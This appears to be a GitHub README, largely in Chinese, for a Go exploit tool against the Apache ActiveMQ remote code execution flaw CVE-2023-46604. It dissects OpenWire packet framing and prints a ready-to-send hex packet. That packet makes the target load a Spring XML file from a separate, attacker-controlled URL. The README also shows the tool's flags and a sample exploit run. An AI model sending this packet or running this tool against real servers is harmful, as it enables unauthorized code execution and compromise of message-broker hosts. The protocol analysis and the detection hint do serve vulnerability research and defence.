# ActiveMQ-RCE

[[English Version]](https://github.com/X1r0z/ActiveMQ-RCE/blob/main/README-en.md)

ActiveMQ RCE (CVE-2023-46604) 漏洞利用工具, 基于 Go 语言

一些详细的分析报告

[https://exp10it.io/2023/10/apache-activemq-版本-5.18.3-rce-分析](https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/)

[https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis](https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis)

## OpenWire 协议分析

参考官方的文档以及 Wireshark 对 OpenWire 协议进行简单分析

[https://activemq.apache.org/openwire-version-2-specification](https://activemq.apache.org/openwire-version-2-specification)

一个简单的 ActiveMQ RCE 数据包如下

```
000000701f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001d687474703a2f2f3132372e302e302e313a383030302f706f632e786d6c
```

我们可以把它分成两个部分: header 和 body

header

```
+----------------------------------------------------------------------------------+
| Packet Length | Command | Command Id | Command response required | CorrelationId |
|---------------|---------|------------|---------------------------|---------------|
|   00000070    |   1f    |  00000000  |          00               |   00000000    |
+----------------------------------------------------------------------------------+
```

Packet Length: body 部分的长度 / 2

Command: Command 类型标识符 (Type Identifier), `1f` 对应 ExceptionResponse

Command Id: 顾名思义, 这里以全 0 填充

Command response required: 表示是否需要响应

CorrelationId: 顾名思义, 这里以全 0 填充

body

```
+--------------------------------------------------------------------------------------+
| not-null | not-null | classname-size | classname | not-null | message-size | message |
|----------|----------|----------------|-----------|----------|--------------|---------|
|    01    |    01    |      0042      |   .....   |    01    |     001d     |  .....  |
+--------------------------------------------------------------------------------------+
```

开头的 not-null 为 `01`, 代表整个 body 部分不为空, 后面每三个部分代表一个 String 类型

not-null 代表 classname 这个字符串不为空, 然后跟上其长度以及 hex 内容 , message 以此类推

可以参考官方文档给出的示意图

String Type Encoding

```
             [=If not-null is 1===========]
+----------+ [ +-------+----------------+ ]
| not-null | [ | size  | encoded-string | ]
+----------+ [ +-------+----------------+ ]
| byte     | [ | short | size octects   | ]
+----------+ [ +-------+----------------+ ]
             [============================]
```

Throwable Type Encoding

```
             [=If not-null is 1===========================================================================]
             [                               [=If StackTraceEnabled option is enabled.==================] ]
             [                               [             [=Repeated size times======================] ] ]
+----------+ [ +----------------+---------+  [ +-------+ [ +--------+--------+--------+-------------+ ] ] ]
| not-null | [ | exception-name | message |  [ | size  | [ | class  | method | file   | line-number | ] ] ]
+----------+ [ +----------------+---------+  [ +-------+ [ +--------+--------+--------+-------------+ ] ] ]
| byte     | [ | string         | string  |  [ | short | [ | string | string | string | int         | ] ] ]
+----------+ [ +----------------+---------+  [ +-------+ [ +--------+--------+--------+-------------+ ] ] ]
             [                               [           [============================================] ] ]
             [                               [==========================================================] ]
             [============================================================================================]
```

## Usage

usage

```bash
     _        _   _           __  __  ___        ____   ____ _____
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

Usage of ./ActiveMQ-RCE:
  -i string
    	ActiveMQ Server IP or Host
  -p string
    	ActiveMQ Server Port (default "61616")
  -u string
    	Spring XML Url
```

exploit

```bash
$ ./ActiveMQ-RCE -i 127.0.0.1 -u http://127.0.0.1:8000/poc.xml
     _        _   _           __  __  ___        ____   ____ _____
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 127.0.0.1:61616
[*] XML URL: http://127.0.0.1:8000/poc.xml

[*] Sending packet: 000000701f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001d687474703a2f2f3132372e302e302e313a383030302f706f632e786d6c
```

如果只是单纯的检测是否存在漏洞, 可以将 spring xml url 改成 dnslog 地址
